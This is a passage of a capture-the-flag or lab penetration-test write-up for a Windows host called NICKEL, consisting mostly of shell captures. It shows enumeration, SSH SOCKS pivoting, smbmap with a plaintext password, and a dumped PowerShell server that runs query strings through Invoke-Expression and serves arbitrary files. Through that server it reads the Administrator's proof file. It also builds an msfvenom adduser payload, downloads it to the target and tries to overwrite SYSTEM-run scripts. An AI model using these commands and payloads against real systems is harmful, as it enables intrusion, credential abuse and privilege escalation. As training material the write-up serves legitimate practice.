               2 Dir(s)   8,138,739,712 bytes free

ariah@NICKEL C:\ftp>cd ..\Program Files

ariah@NICKEL C:\Program Files>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Program Files

10/19/2020  07:39 AM    <DIR>          .
10/19/2020  07:39 AM    <DIR>          ..
09/01/2020  05:35 PM    <DIR>          Common Files
09/01/2020  11:04 AM    <DIR>          Internet Explorer
09/01/2020  10:47 AM    <DIR>          Microsoft Update Health Tools
03/18/2019  08:52 PM    <DIR>          ModifiableWindowsApps
09/01/2020  11:38 AM    <DIR>          OpenSSH
10/16/2020  05:11 AM    <DIR>          UNP
10/19/2020  07:39 AM    <DIR>          VMware
09/01/2020  11:04 AM    <DIR>          Windows Defender
09/01/2020  11:04 AM    <DIR>          Windows Defender Advanced Threat Protection
09/01/2020  11:04 AM    <DIR>          Windows Mail
09/01/2020  11:04 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
09/01/2020  11:04 AM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          Windows Security
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              19 Dir(s)   8,138,739,712 bytes free

ariah@NICKEL C:\Program Files>cd UNP

ariah@NICKEL C:\Program Files\UNP>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Program Files\UNP

10/16/2020  05:11 AM    <DIR>          .
10/16/2020  05:11 AM    <DIR>          ..
02/20/2022  02:15 AM    <DIR>          SystemLogs
10/20/2020  08:47 AM    <DIR>          UpdateNotificationMgr
               0 File(s)              0 bytes
               4 Dir(s)   8,141,557,760 bytes free

ariah@NICKEL C:\Program Files\UNP>cd UpdateNotificationMgr

ariah@NICKEL C:\Program Files\UNP\UpdateNotificationMgr>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Program Files\UNP\UpdateNotificationMgr

10/20/2020  08:47 AM    <DIR>          .
10/20/2020  08:47 AM    <DIR>          ..
10/20/2020  08:47 AM    <DIR>          UNPCampaigns
10/20/2020  08:47 AM             1,199 UpdateNotificationCatalog.json
               1 File(s)          1,199 bytes
               3 Dir(s)   8,141,557,760 bytes free

ariah@NICKEL C:\Program Files\UNP\UpdateNotificationMgr>cd \Program Files (x86)

ariah@NICKEL C:\Program Files (x86)>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Program Files (x86)

09/01/2020  11:38 AM    <DIR>          .
09/01/2020  11:38 AM    <DIR>          ..
03/18/2019  09:02 PM    <DIR>          Common Files
09/01/2020  11:38 AM    <DIR>          FileZilla Server
09/01/2020  11:04 AM    <DIR>          Internet Explorer
03/18/2019  08:52 PM    <DIR>          Microsoft.NET
03/18/2019  10:20 PM    <DIR>          Windows Defender
09/01/2020  11:04 AM    <DIR>          Windows Mail
09/01/2020  11:04 AM    <DIR>          Windows Media Player
03/18/2019  10:23 PM    <DIR>          Windows Multimedia Platform
03/18/2019  09:02 PM    <DIR>          Windows NT
09/01/2020  11:04 AM    <DIR>          Windows Photo Viewer
03/18/2019  10:23 PM    <DIR>          Windows Portable Devices
03/18/2019  08:52 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)   8,141,492,224 bytes free

ariah@NICKEL C:\Program Files (x86)>cd \Users

ariah@NICKEL C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 9451-68F7

 Directory of C:\Users

09/01/2020  11:38 AM    <DIR>          .
09/01/2020  11:38 AM    <DIR>          ..
02/15/2022  05:13 AM    <DIR>          Administrator
10/15/2020  06:23 AM    <DIR>          ariah
09/01/2020  05:28 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   8,141,492,224 bytes free

ariah@NICKEL C:\Users>
```

## enum SMB/ Pivoting

WinPEAS

```powershell
╔══════════╣ Current TCP Listening Ports                                                                                                              
╚ Check for services restricted from the outside                                                                                               
  Enumerating IPv4 connections                                                                                                                                   
                                                                                                                                                                        
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               21            0.0.0.0               0               Listening         2024            FileZilla Server
  TCP        0.0.0.0               22            0.0.0.0               0               Listening         1488            sshd
  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         768             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         976             svchost
  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         912             svchost
  TCP        0.0.0.0               8089          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               33333         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         584             lsass
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         484             wininit
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1004            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         968             svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         1764            spoolsv
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         576             services
  TCP        127.0.0.1             14147         0.0.0.0               0               Listening         2024            FileZilla Server                
  TCP        192.168.140.99        22            192.168.49.140        33362           Established       1488            sshd
  TCP        192.168.140.99        22            192.168.49.140        35704           Established       1488            sshd
  TCP        192.168.140.99        139           0.0.0.0               0               Listening         4               System
                                                                                                                                                                
  Enumerating IPv6 connections       
```

```bash
┌──(kali㉿kali)-[~]
└─$ ssh ariah@192.168.140.99 -D 127.0.0.1:1080                                                                                                                    130 ⨯
ariah@192.168.140.99's password: 
Microsoft Windows [Version 10.0.18362.1016]         
(c) 2019 Microsoft Corporation. All rights reserved.
                                                    
ariah@NICKEL C:\Users\ariah>
```

```bash
┌──(kali㉿kali)-[~]
└─$ proxychains4 smbmap -H 192.168.140.99 -P 445 -u ariah -p NowiseSloopTheory139                                                                                   2 ⨯
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.140.99:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.140.99:445  ...  OK
[+] IP: 192.168.140.99:445      Name: 192.168.140.99                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

![](Pasted%20image%2020220220183151.png)

## Web server code

```powershell
ariah@NICKEL C:\>type C:\windows\system32\ws8089.ps1 
Start-Sleep -Seconds 30
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:8089/")
$listener.Start()

$ipv4 = Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address
$ipv4address = $ipv4.IPAddressToString

while ($listener.IsListening) {
    $context = $listener.GetContext()

    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {

        [string]$html = "<h1>DevOps Dashboard</h1>
<hr>
<form action='http://$($ipv4address):33333/list-current-deployments' method='GET'>
<input type='submit' value='List Current Deployments'>
</form>
<br>
<form action='http://$($ipv4address):33333/list-running-procs' method='GET'>
<input type='submit' value='List Running Processes'>
</form>
<br>
<form action='http://$($ipv4address):33333/list-active-nodes' method='GET'>
<input type='submit' value='List Active Nodes'>
</form>
<hr>"

        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'GET') {
        [string]$html = 'Not Found'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
}
ariah@NICKEL C:\>type C:\windows\system32\ws33333.ps1 
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:33333/")
$listener.Start()

while ($listener.IsListening) {
    $context = $listener.GetContext()

    if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/') {

        [string]$html = 'Invalid Token'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/list-running-procs') {
        [string]$html = '<p>Cannot "GET" /list-running-procs</p>'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/list-running-procs') {
        $html = (Get-WmiObject win32_process | select name,commandline | Where-Object { $_ -NotMatch "svchost.exe"} | Format-List | Out-String)
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/list-current-deployments') {
        [string]$html = '<p>Cannot "GET" /list-current-deployments</p>'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/list-active-nodes') {
        [string]$html = '<p>Cannot "GET" /list-active-nodes</p>'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'POST') {
        [string]$html = '<p>Not Implemented</p>'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
    elseif ($context.Request.HttpMethod -eq 'GET') {
        [string]$html = '<p>Not Found</p>'
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
        $context.Response.ContentLength64 = $buffer.Length
        $context.Response.OutputStream.Write($buffer, 0, $buffer.Length)
        $context.Response.OutputStream.Close()
    }
}
ariah@NICKEL C:\>
ariah@NICKEL C:\>type C:\windows\system32\ws80.ps1
Param([STRING]$BINDING = 'http://+:80/', [STRING]$BASEDIR = "C:\temp\")

if ($BASEDIR -eq "")
{       # current filesystem path as base path for static content
        $BASEDIR = (Get-Location -PSProvider "FileSystem").ToString()
}
# convert to absolute path
$BASEDIR = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($BASEDIR)

# HTML answer templates for specific calls, placeholders !RESULT, !FORMFIELD, !PROMPT are allowed
$HTMLRESPONSECONTENTS = @{
        'GET /'  =  @"
<!doctype html><html><body>dev-api started at $(Get-Date -Format s)

        <pre>!RESULT</pre>
</body></html>
"@
}

# Set navigation header line for all web pages
# $HEADERLINE = "<p><a href='/'>Command execution</a> <a href='/script'>Execute script</a> <a href='/download'>Download file</a> <a href='/upload'>Upload file</a> <a hr
ef='/log'>Web logs</a> <a href='/starttime'>Webserver start time</a> <a href='/time'>Current time</a> <a href='/beep'>Beep</a> <a href='/quit'>Stop webserver</a></p>"  

# Starting the powershell webserver
"$(Get-Date -Format s) Starting powershell webserver..."
$LISTENER = New-Object System.Net.HttpListener
$LISTENER.Prefixes.Add($BINDING)
$LISTENER.Start()
$Error.Clear()

try
{
        "$(Get-Date -Format s) Powershell webserver started."
        $WEBLOG = "$(Get-Date -Format s) Powershell webserver started.`n"
        while ($LISTENER.IsListening)
        {
                # analyze incoming request
                $CONTEXT = $LISTENER.GetContext()
                $REQUEST = $CONTEXT.Request
                $RESPONSE = $CONTEXT.Response
                $RESPONSEWRITTEN = $FALSE

                # log to console
                "$(Get-Date -Format s) $($REQUEST.RemoteEndPoint.Address.ToString()) $($REQUEST.httpMethod) $($REQUEST.Url.PathAndQuery)"
                # and in log variable
                $WEBLOG += "$(Get-Date -Format s) $($REQUEST.RemoteEndPoint.Address.ToString()) $($REQUEST.httpMethod) $($REQUEST.Url.PathAndQuery)`n"

                # is there a fixed coding for the request?
                $RECEIVED = '{0} {1}' -f $REQUEST.httpMethod, $REQUEST.Url.LocalPath
                $HTMLRESPONSE = $HTMLRESPONSECONTENTS[$RECEIVED]
                $RESULT = ''

                # check for known commands
                switch ($RECEIVED)
                {
                        "GET /"
                        {
#                               $FORMFIELD = ''
                                $FORMFIELD = [URI]::UnescapeDataString(($REQUEST.Url.Query -replace "\?",""))

                                if (![STRING]::IsNullOrEmpty($FORMFIELD))
                                {
                                        try {

                                                $RESULT = Invoke-Expression -EA SilentlyContinue $FORMFIELD 2> $NULL | Out-String
                                        }
                                        catch
                                        {
                                                # just ignore. Error handling comes afterwards since not every error throws an exception
                                        }
                                        if ($Error.Count -gt 0)
                                        { # retrieve error message on error
                                                $RESULT += "`nError while executing '$FORMFIELD'`n`n"
                                                $RESULT += $Error[0]
                                                $Error.Clear()
                                        }
                                }
                        }

                        { $_ -like "* /download" } # GET or POST method are allowed for download page
                        {       # download file

                                # is POST data in the request?
                                if ($REQUEST.HasEntityBody)
                                { # POST request
                                        # read complete header into string
                                        $READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
                                        $DATA = $READER.ReadToEnd()
                                        $READER.Close()
                                        $REQUEST.InputStream.Close()

                                        # get headers into hash table
                                        $HEADER = @{}
                                        $DATA.Split('&') | ForEach-Object { $HEADER.Add([URI]::UnescapeDataString(($_.Split('=')[0] -replace "\+"," ")), [URI]::Unescape
DataString(($_.Split('=')[1] -replace "\+"," "))) }

                                        # read header 'filepath'
                                        $FORMFIELD = $HEADER.Item('filepath')
                                        # remove leading and trailing double quotes since Test-Path does not like them
                                        $FORMFIELD = $FORMFIELD -replace "^`"","" -replace "`"$",""
                                }
                                else {

                                }

                                # when path is given...
                                if (![STRING]::IsNullOrEmpty($FORMFIELD))
                                { # check if file exists
                                        if (Test-Path $FORMFIELD -PathType Leaf)
                                        {
                                                try {
                                                        # ... download file
                                                        $BUFFER = [System.IO.File]::ReadAllBytes($FORMFIELD)
                                                        $RESPONSE.ContentLength64 = $BUFFER.Length
                                                        $RESPONSE.SendChunked = $FALSE
                                                        $RESPONSE.ContentType = "application/octet-stream"
                                                        $FILENAME = Split-Path -Leaf $FORMFIELD
                                                        $RESPONSE.AddHeader("Content-Disposition", "attachment; filename=$FILENAME")
                                                        $RESPONSE.AddHeader("Last-Modified", [IO.File]::GetLastWriteTime($FORMFIELD).ToString('r'))
                                                        $RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
                                                        $RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
                                                        # mark response as already given
                                                        $RESPONSEWRITTEN = $TRUE
                                                }
                                                catch
                                                {
                                                        # just ignore. Error handling comes afterwards since not every error throws an exception
                                                }
                                                if ($Error.Count -gt 0)
                                                { # retrieve error message on error
                                                        $RESULT += "`nError while downloading '$FORMFIELD'`n`n"
                                                        $RESULT += $Error[0]
                                                        $Error.Clear()
                                                }
                                        }
                                        else
                                        {
                                                # ... file not found
                                                $RESULT = "File $FORMFIELD not found"
                                        }
                                }
                                # preset form value with file path for the caller's convenience
                                $HTMLRESPONSE = $HTMLRESPONSE -replace '!FORMFIELD', $FORMFIELD
                                break
                        }

                        "GET /upload"
                        { # present upload form, nothing to do here
                                break
                        }

                        "POST /upload"
                        { # upload file

                                # only if there is body data in the request
                                if ($REQUEST.HasEntityBody)
                                {
                                        # set default message to error message (since we just stop processing on error)
                                        $RESULT = "Received corrupt or incomplete form data"

                                        # check content type
                                        if ($REQUEST.ContentType)
                                        {
                                                # retrieve boundary marker for header separation
                                                $BOUNDARY = $NULL
                                                if ($REQUEST.ContentType -match "boundary=(.*);")
                                                {       $BOUNDARY = "--" + $MATCHES[1] }
                                                else
                                                { # marker might be at the end of the line
                                                        if ($REQUEST.ContentType -match "boundary=(.*)$")
                                                        { $BOUNDARY = "--" + $MATCHES[1] }
                                                }

                                                if ($BOUNDARY)
                                                { # only if header separator was found

                                                        # read complete header (inkl. file data) into string
                                                        $READER = New-Object System.IO.StreamReader($REQUEST.InputStream, $REQUEST.ContentEncoding)
                                                        $DATA = $READER.ReadToEnd()
                                                        $READER.Close()
                                                        $REQUEST.InputStream.Close()

                                                        # variables for filenames
                                                        $FILENAME = ""
                                                        $SOURCENAME = ""

                                                        # separate headers by boundary string
                                                        $DATA -replace "$BOUNDARY--\r\n", "$BOUNDARY`r`n--" -split "$BOUNDARY\r\n" | ForEach-Object {
                                                                # omit leading empty header and end marker header
                                                                if (($_ -ne "") -and ($_ -ne "--"))
                                                                {
                                                                        # only if well defined header (seperation between meta data and data)
                                                                        if ($_.IndexOf("`r`n`r`n") -gt 0)
                                                                        {
                                                                                # header data before two CRs is meta data
                                                                                # first look for the file in header "filedata"
                                                                                if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-data; name
=(.*);")
                                                                                {
                                                                                        $HEADERNAME = $MATCHES[1] -replace '\"'
                                                                                        # headername "filedata"?
                                                                                        if ($HEADERNAME -eq "filedata")
                                                                                        { # yes, look for source filename
                                                                                                if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "filename=(.*)")     
                                                                                                { # source filename found
                                                                                                        $SOURCENAME = $MATCHES[1] -replace "`r`n$" -replace "`r$" -repla
ce '\"'
                                                                                                        # store content of file in variable
                                                                                                        $FILEDATA = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`
r`n$"
                                                                                                }
                                                                                        }
                                                                                }
                                                                                else
                                                                                { # look for other headers (we need "filepath" to know where to store the file)
                                                                                        if ($_.Substring(0, $_.IndexOf("`r`n`r`n")) -match "Content-Disposition: form-da
ta; name=(.*)")
                                                                                        { # header found
                                                                                                $HEADERNAME = $MATCHES[1] -replace '\"'
                                                                                                # headername "filepath"?
                                                                                                if ($HEADERNAME -eq "filepath")
                                                                                                { # yes, look for target filename
                                                                                                        $FILENAME = $_.Substring($_.IndexOf("`r`n`r`n") + 4) -replace "`
r`n$" -replace "`r$" -replace '\"'
                                                                                                }
                                                                                        }
                                                                                }
                                                                        }
                                                                }
                                                        }

                                                        if ($FILENAME -ne "")
                                                        { # upload only if a targetname is given
                                                                if ($SOURCENAME -ne "")
                                                                { # only upload if source file exists

                                                                        # check or construct a valid filename to store
                                                                        $TARGETNAME = ""
                                                                        # if filename is a container name, add source filename to it
                                                                        if (Test-Path $FILENAME -PathType Container)
                                                                        {
                                                                                $TARGETNAME = Join-Path $FILENAME -ChildPath $(Split-Path $SOURCENAME -Leaf)
                                                                        } else {
                                                                                # try name in the header
                                                                                $TARGETNAME = $FILENAME
                                                                        }

                                                                        try {
                                                                                # ... save file with the same encoding as received
                                                                                [IO.File]::WriteAllText($TARGETNAME, $FILEDATA, $REQUEST.ContentEncoding)
                                                                        }
                                                                        catch
                                                                        {
                                                                                # just ignore. Error handling comes afterwards since not every error throws an exception
                                                                        }
                                                                        if ($Error.Count -gt 0)
                                                                        { # retrieve error message on error
                                                                                $RESULT += "`nError saving '$TARGETNAME'`n`n"
                                                                                $RESULT += $Error[0]
                                                                                $Error.Clear()
                                                                        }
                                                                        else
                                                                        { # success
                                                                                $RESULT = "File $SOURCENAME successfully uploaded as $TARGETNAME"
                                                                        }
                                                                }
                                                                else
                                                                {
                                                                        $RESULT = "No file data received"
                                                                }
                                                        }
                                                        else
                                                        {
                                                                $RESULT = "Missing target file name"
                                                        }
                                                }
                                        }
                                }
                                else
                                {
                                        $RESULT = "No client data received"
                                }
                                break
                        }

                        "GET /log"
                        { # return the webserver log (stored in log variable)
                                $RESULT = $WEBLOG
                                break
                        }

                        "GET /time"
                        { # return current time
                                $RESULT = Get-Date -Format s
                                break
                        }

                        "GET /starttime"
                        { # return start time of the powershell webserver (already contained in $HTMLRESPONSE, nothing to do here)
                                break
                        }

                        "GET /beep"
                        { # Beep
                                [CONSOLE]::beep(800, 300) # or "`a" or [char]7
                                break
                        }

                        "GET /quit"
                        { # stop powershell webserver, nothing to do here
                                break
                        }

                        "GET /exit"
                        { # stop powershell webserver, nothing to do here
                                break
                        }

                        default
                        {       # unknown command, check if path to file

                                # create physical path based upon the base dir and url
                                $CHECKDIR = $BASEDIR.TrimEnd("/\") + $REQUEST.Url.LocalPath
                                $CHECKFILE = ""
                                if (Test-Path $CHECKDIR -PathType Container)
                                { # physical path is a directory
                                        $IDXLIST = "/index.htm", "/index.html", "/default.htm", "/default.html"
                                        foreach ($IDXNAME in $IDXLIST)
                                        { # check if an index file is present
                                                $CHECKFILE = $CHECKDIR.TrimEnd("/\") + $IDXNAME
                                                if (Test-Path $CHECKFILE -PathType Leaf)
                                                { # index file found, path now in $CHECKFILE
                                                        break
                                                }
                                                $CHECKFILE = ""
                                        }

                                        if ($CHECKFILE -eq "")
                                        { # generate directory listing
                                                $HTMLRESPONSE = "<!doctype html><html><head><title>$($REQUEST.Url.LocalPath)</title><meta charset=""utf-8""></head><body
><H1>$($REQUEST.Url.LocalPath)</H1><hr><pre>"
                                                if ($REQUEST.Url.LocalPath -ne "" -And $REQUEST.Url.LocalPath -ne "/" -And $REQUEST.Url.LocalPath -ne "`\"  -And $REQUES
T.Url.LocalPath -ne ".")
                                                { # link to parent directory
                                                        $PARENTDIR = (Split-Path $REQUEST.Url.LocalPath -Parent) -replace '\\','/'
                                                        if ($PARENTDIR.IndexOf("/") -ne 0) { $PARENTDIR = "/" + $PARENTDIR }
                                                        $HTMLRESPONSE += "<pre><a href=""$PARENTDIR"">[To Parent Directory]</a><br><br>"
                                                }

                                                # read in directory listing
                                                $ENTRIES = Get-ChildItem -EA SilentlyContinue -Path $CHECKDIR

                                                # process directories
                                                $ENTRIES | Where-Object { $_.PSIsContainer } | ForEach-Object { $HTMLRESPONSE += "$($_.LastWriteTime.ToString())       &
lt;dir&gt; <a href=""$(Join-Path $REQUEST.Url.LocalPath $_.Name)"">$($_.Name)</a><br>" }

                                                # process files
                                                $ENTRIES | Where-Object { !$_.PSIsContainer } | ForEach-Object { $HTMLRESPONSE += "$($_.LastWriteTime.ToString())  $("{0
,10}" -f $_.Length) <a href=""$(Join-Path $REQUEST.Url.LocalPath $_.Name)"">$($_.Name)</a><br>" }

                                                # end of directory listing
                                                $HTMLRESPONSE += "</pre><hr></body></html>"
                                        }
                                }
                                else
                                        { # no directory, check for file
                                                if (Test-Path $CHECKDIR -PathType Leaf)
                                                { # file found, path now in $CHECKFILE
                                                        $CHECKFILE = $CHECKDIR
                                                }
                                        }

                                if ($CHECKFILE -ne "")
                                { # static content available
                                        try {
                                                # ... serve static content
                                                $BUFFER = [System.IO.File]::ReadAllBytes($CHECKFILE)
                                                $RESPONSE.ContentLength64 = $BUFFER.Length
                                                $RESPONSE.SendChunked = $FALSE
                                                $EXTENSION = [IO.Path]::GetExtension($CHECKFILE)
                                                if ($MIMEHASH.ContainsKey($EXTENSION))
                                                { # known mime type for this file's extension available
                                                        $RESPONSE.ContentType = $MIMEHASH.Item($EXTENSION)
                                                }
                                                else
                                                { # no, serve as binary download
                                                        $RESPONSE.ContentType = "application/octet-stream"
                                                        $FILENAME = Split-Path -Leaf $CHECKFILE
                                                        $RESPONSE.AddHeader("Content-Disposition", "attachment; filename=$FILENAME")
                                                }
                                                $RESPONSE.AddHeader("Last-Modified", [IO.File]::GetLastWriteTime($CHECKFILE).ToString('r'))
                                                $RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
                                                $RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
                                                # mark response as already given
                                                $RESPONSEWRITTEN = $TRUE
                                        }
                                        catch
                                        {
                                                # just ignore. Error handling comes afterwards since not every error throws an exception
                                        }

                                }
                                else
                                {       # no file to serve found, return error
                                        if (!(Test-Path $CHECKDIR -PathType Container))
                                        {
                                                $RESPONSE.StatusCode = 404
                                                $HTMLRESPONSE = '<!doctype html><html><body>Incorrect Parameter</body></html>'
                                        }
                                }
                        }

                }

                # only send response if not already done
                if (!$RESPONSEWRITTEN)
                {
                        # insert header line string into HTML template
                        $HTMLRESPONSE = $HTMLRESPONSE -replace '!HEADERLINE', $HEADERLINE

                        # insert result string into HTML template
                        $HTMLRESPONSE = $HTMLRESPONSE -replace '!RESULT', $RESULT

                        # return HTML answer to caller
                        $BUFFER = [Text.Encoding]::UTF8.GetBytes($HTMLRESPONSE)
                        $RESPONSE.ContentLength64 = $BUFFER.Length
                        $RESPONSE.AddHeader("Last-Modified", [DATETIME]::Now.ToString('r'))
                        $RESPONSE.AddHeader("Server", "Powershell Webserver/1.2 on ")
                        $RESPONSE.OutputStream.Write($BUFFER, 0, $BUFFER.Length)
                }

                # and finish answer to client
                $RESPONSE.Close()

                # received command to stop webserver?
                if ($RECEIVED -eq 'GET /exit' -or $RECEIVED -eq 'GET /quit')
                { # then break out of while loop
                        "$(Get-Date -Format s) Stopping powershell webserver..."
                        break;
                }
        }
}
finally
{
        # Stop powershell webserver
        $LISTENER.Stop()
        $LISTENER.Close()
        "$(Get-Date -Format s) Powershell webserver stopped."
}

ariah@NICKEL C:\>

```

### Get proof.txt

```bash
┌──(kali㉿kali)-[/tmp]
└─$ proxychains4 -q curl http://192.168.140.99/download -v --data 'filepath=c:\Users\Administrator\Desktop\proof.txt'
*   Trying 192.168.140.99:80...
* Connected to 192.168.140.99 (127.0.0.1) port 80 (#0)
> POST /download HTTP/1.1
> Host: 192.168.140.99
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Length: 49
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 49 out of 49 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 34
< Content-Type: application/octet-stream
< Last-Modified: Sun, 20 Feb 2022 01:44:32 GMT
< Server: Powershell Webserver/1.2 on Microsoft-HTTPAPI/2.0
< Content-Disposition: attachment; filename=proof.txt
< Date: Sun, 20 Feb 2022 11:39:46 GMT
< 
0e790a17626e5cb0b8b8bbffce3dfa1c
* Connection #0 to host 192.168.140.99 left intact
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

### Scheduled Script Test?

```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/adduser USER=hacker PASS=P@ssw0rd1234 -f exe -o adduser.exe                          
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 274 bytes
Final size of exe file: 73802 bytes
Saved as: adduser.exe
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```powershell
PS C:\ftp> wget 192.168.49.140/adduser.exe -O adduser.exe
C:\windows\system32\ws80.ps1 NT AUTHORITY\SYSTEM:(I)(F)
                             BUILTIN\Administrators:(I)(F)
                             BUILTIN\Users:(I)(RX)
                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\ftp> dir


    Directory: C:\ftp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/20/2022   3:57 AM          73802 adduser.exe
-a----         9/1/2020  11:02 AM          46235 Infrastructure.pdf
-a----        2/20/2022   2:18 AM          35108 winPEAS.bat
-a----        2/20/2022   2:20 AM        1930752 wp.exe
-a----        8/31/2020  10:30 PM          15051 ws80.ps1


PS C:\ftp> echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws80.ps1
out-file : Access to the path 'C:\windows\system32\ws80.ps1' is denied.
At line:1 char:1
+ echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws80.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
 
PS C:\ftp> echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws8089.ps1
out-file : Access to the path 'C:\windows\system32\ws8089.ps1' is denied.
At line:1 char:1
+ echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws8089.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand
 
PS C:\ftp> echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws33333.ps1
out-file : Access to the path 'C:\windows\system32\ws33333.ps1' is denied.
At line:1 char:1
+ echo 'C:\ftp\adduser.exe' > C:\windows\system32\ws33333.ps1
